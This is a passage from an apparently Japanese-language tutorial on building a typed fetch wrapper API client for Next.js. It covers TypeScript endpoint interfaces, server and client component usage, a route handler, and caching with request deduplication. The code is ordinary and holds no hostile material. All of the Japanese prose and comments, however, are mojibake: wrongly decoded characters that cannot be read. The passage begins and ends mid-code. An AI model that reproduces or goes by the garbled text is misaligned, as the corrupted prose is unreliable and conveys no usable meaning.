<span class="token keyword">export</span> <span class="token keyword">const</span> api <span class="token operator">=</span> <span class="token keyword">typeof</span> window <span class="token operator">===</span> <span class="token string">'undefined'</span> <span class="token operator">?</span> serverApi <span class="token operator">:</span> clientApi<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã¯éå¸¸ã«<strong>ç”»æœŸçš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒ</strong>ã§ã™ã€‚ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ„è­˜ã—ãŸã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§ç•°ãªã‚‹æŒ™å‹•ã‚’ã•ã›ãªãŒã‚‰ã€ã©ã“ã§ã‚‚åŒã˜APIã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯çµ¶å¯¾URLã¨ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰èªè¨¼ã‚’ä½¿ç”¨ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ç›¸å¯¾URLã¨ãƒ–ãƒ©ã‚¦ã‚¶ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã„ã£ãŸå…·åˆã§ã™ã€‚</p>
<h2>TypeScriptï¼šå‹å®‰å…¨ã«ã™ã‚‹</h2>
<p>ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ã•ã‚‰ã«å …ç‰¢ã«ã™ã‚‹ãŸã‚ã«ã€é©åˆ‡ãªTypeScriptã‚µãƒãƒ¼ãƒˆã‚’è¿½åŠ ã—ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts - TypeScriptã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®è¿½åŠ </span>
<span class="token keyword">interface</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
  id<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  name<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  email<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">ApiEndpoints</span> <span class="token punctuation">{</span>
  <span class="token comment">// APIã®å½¢çŠ¶ã‚’å®šç¾©</span>
  <span class="token string-property property">'/users'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token constant">GET</span><span class="token operator">:</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> User<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token constant">POST</span><span class="token operator">:</span> <span class="token punctuation">{</span> body<span class="token operator">:</span> Omit<span class="token operator">&lt;</span>User<span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token operator">></span><span class="token punctuation">;</span> data<span class="token operator">:</span> User <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token string-property property">'/users/:id'</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token constant">GET</span><span class="token operator">:</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> User <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token constant">PUT</span><span class="token operator">:</span> <span class="token punctuation">{</span> body<span class="token operator">:</span> Partial<span class="token operator">&lt;</span>User<span class="token operator">></span><span class="token punctuation">;</span> data<span class="token operator">:</span> User <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token constant">DELETE</span><span class="token operator">:</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> <span class="token punctuation">{</span> success<span class="token operator">:</span> <span class="token builtin">boolean</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// å‹å®‰å…¨ãªãƒ©ãƒƒãƒ‘ãƒ¼ãƒ¡ã‚½ãƒƒãƒ‰</span>
<span class="token keyword">class</span> <span class="token class-name">TypedApiClient</span> <span class="token keyword">extends</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">getTyped</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span> <span class="token keyword">extends</span> <span class="token keyword">keyof</span> ApiEndpoints<span class="token punctuation">,</span> <span class="token constant">M</span> <span class="token keyword">extends</span> <span class="token keyword">keyof</span> ApiEndpoints<span class="token punctuation">[</span><span class="token constant">T</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">,</span>
    method<span class="token operator">:</span> <span class="token constant">M</span> <span class="token keyword">extends</span> <span class="token string">'GET'</span> <span class="token operator">?</span> <span class="token string">'GET'</span> <span class="token operator">:</span> <span class="token builtin">never</span>
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiEndpoints<span class="token punctuation">[</span><span class="token constant">T</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">]</span> <span class="token keyword">extends</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> <span class="token keyword">infer</span> <span class="token constant">D</span> <span class="token punctuation">}</span> <span class="token operator">?</span> <span class="token constant">D</span> <span class="token operator">:</span> <span class="token builtin">never</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>endpoint <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> response<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// POSTã€PUTã€DELETEãªã©ã«ã¤ã„ã¦ã‚‚åŒæ§˜ã®ãƒ¡ã‚½ãƒƒãƒ‰...</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã«ã‚ˆã‚Šè¤‡é›‘ã•ã¯å¢—ã—ã¾ã™ãŒã€<strong>ç´ æ™´ã‚‰ã—ã„é–‹ç™ºè€…ä½“é¨“</strong>ã‚’æä¾›ã—ã¾ã™ã€‚IDEãŒã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ã‚ªãƒ¼ãƒˆã‚³ãƒ³ãƒ—ãƒªãƒ¼ãƒˆã—ã€ã‚¿ã‚¤ãƒ—ãƒŸã‚¹ã‚’æ¤œçŸ¥ã—ã€æ­£ã—ã„ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å‹ã‚’æ¸¡ã—ã¦ã„ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¦ãã‚Œã¾ã™ã€‚</p>
<h2>Next.jsã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã®ä½¿ç”¨æ–¹æ³•</h2>
<p>ã§ã¯ã€å®Ÿéš›ã®Next.jsã®ã‚·ãƒŠãƒªã‚ªã§ã€ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ãŒã©ã®ã‚ˆã†ã«è¼ãã‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<h3>ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã®ä½¿ç”¨ä¾‹</h3>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// app/users/page.tsx - ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> serverApi <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/api'</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
  id<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  name<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  email<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">UsersPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> users <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> serverApi<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span>User<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token string">'/users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
      <span class="token operator">&lt;</span>div<span class="token operator">></span>
        <span class="token operator">&lt;</span>h1<span class="token operator">></span>Users<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
        <span class="token punctuation">{</span>users<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>user <span class="token operator">=></span> <span class="token punctuation">(</span>
          <span class="token operator">&lt;</span>div key<span class="token operator">=</span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>id<span class="token punctuation">}</span><span class="token operator">></span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>error <span class="token keyword">instanceof</span> <span class="token class-name">ApiError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>Error<span class="token operator">:</span> <span class="token punctuation">{</span>error<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>Something went wrong<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Reactãƒ•ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ</h3>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// components/UserProfile.tsx - ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> clientApi<span class="token punctuation">,</span> ApiError <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/api'</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
  id<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  name<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  email<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">interface</span> <span class="token class-name">UserProfileProps</span> <span class="token punctuation">{</span>
  userId<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">UserProfile</span><span class="token punctuation">(</span><span class="token punctuation">{</span> userId <span class="token punctuation">}</span><span class="token operator">:</span> UserProfileProps<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>user<span class="token punctuation">,</span> setUser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token generic-function"><span class="token function">useState</span><span class="token generic class-name"><span class="token operator">&lt;</span>User <span class="token operator">|</span> <span class="token keyword">null</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>loading<span class="token punctuation">,</span> setLoading<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>error<span class="token punctuation">,</span> setError<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token generic-function"><span class="token function">useState</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">fetchUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> clientApi<span class="token punctuation">.</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span>User<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/users/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>userId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setUser</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err <span class="token keyword">instanceof</span> <span class="token class-name">ApiError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">setError</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          <span class="token function">setError</span><span class="token punctuation">(</span><span class="token string">'An unexpected error occurred'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
        <span class="token function">setLoading</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">fetchUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>userId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>loading<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>Loading<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>Error<span class="token operator">:</span> <span class="token punctuation">{</span>error<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">></span>User not found<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token operator">&lt;</span>div<span class="token operator">></span>
      <span class="token operator">&lt;</span>h2<span class="token operator">></span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span>
      <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token punctuation">{</span>user<span class="token punctuation">.</span>email<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>ãƒ«ãƒ¼ãƒˆãƒãƒ³ãƒ‰ãƒ©ã§ã®ä½¿ç”¨ä¾‹</h3>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// app/api/users/route.ts - APIãƒ«ãƒ¼ãƒˆãƒãƒ³ãƒ‰ãƒ©</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NextRequest <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next/server'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> serverApi <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/api'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token constant">GET</span><span class="token punctuation">(</span>request<span class="token operator">:</span> NextRequest<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token comment">// å¤–éƒ¨APIã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è»¢é€</span>
    <span class="token keyword">const</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">await</span> serverApi<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/external-api/users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>error <span class="token keyword">instanceof</span> <span class="token class-name">ApiError</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> Response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span> error<span class="token operator">:</span> error<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span> status<span class="token operator">:</span> error<span class="token punctuation">.</span>status <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>
      <span class="token punctuation">{</span> error<span class="token operator">:</span> <span class="token string">'Internal server error'</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token punctuation">{</span> status<span class="token operator">:</span> <span class="token number">500</span> <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>é«˜åº¦ãªæ©Ÿèƒ½ï¼šã‚­ãƒ£ãƒƒã‚·ãƒ¥ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é‡è¤‡æ’é™¤</h2>
<p>æœ¬ç•ªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é‡è¤‡æ’é™¤ã‚’è¿½åŠ ã—ãŸããªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts - é«˜åº¦ãªæ©Ÿèƒ½</span>
<span class="token keyword">class</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map<span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">;</span> timestamp<span class="token operator">:</span> <span class="token builtin">number</span> <span class="token punctuation">}</span><span class="token operator">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> pendingRequests <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map<span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">any</span><span class="token operator">>></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    options<span class="token operator">?</span><span class="token operator">:</span> RequestInit <span class="token operator">&amp;</span> <span class="token punctuation">{</span> cache<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">boolean</span><span class="token punctuation">;</span> cacheTTL<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">number</span> <span class="token punctuation">}</span>
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> cacheKey <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">GET:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>endpoint<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> now <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// ã¾ãšã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’ãƒã‚§ãƒƒã‚¯</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token operator">?.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> cached <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> ttl <span class="token operator">=</span> options<span class="token punctuation">.</span>cacheTTL <span class="token operator">||</span> <span class="token number">60000</span><span class="token punctuation">;</span> <span class="token comment">// ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯1åˆ†</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>cached <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> cached<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> ttl<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> cached<span class="token punctuation">.</span>data<span class="token punctuation">,</span> status<span class="token operator">:</span> <span class="token number">200</span><span class="token punctuation">,</span> headers<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Headers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// åŒæ™‚ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é‡è¤‡æ’é™¤</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>pendingRequests<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pendingRequests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">const</span> requestPromise <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token operator">...</span>options<span class="token punctuation">,</span> method<span class="token operator">:</span> <span class="token string">'GET'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
